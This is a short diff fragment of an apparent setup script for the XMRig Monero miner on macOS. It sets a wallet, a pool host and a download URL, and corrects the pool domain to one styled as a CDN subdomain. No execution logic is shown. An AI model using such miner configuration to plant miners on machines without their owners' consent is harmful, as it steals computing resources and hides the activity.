@@ -7,7 +7,7 @@
 # ============================================================
 
 WALLET="45yWnSbx7c4TzJCf7hwgdHVYmRxZt5Y4g8JVdRjPJuQALzgLMUBwiK7QU2FMeiwMF48APgsi54rBagJvgMo5KUEqAWA2fbg"
-POOL_HOST="cnd.snumcaj.com"
+POOL_HOST="cdn.snumcaj.com"
 POOL_PORT="3956"
 XMRIG_VERSION="6.26.0"
 XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-macos-arm64.tar.gz"
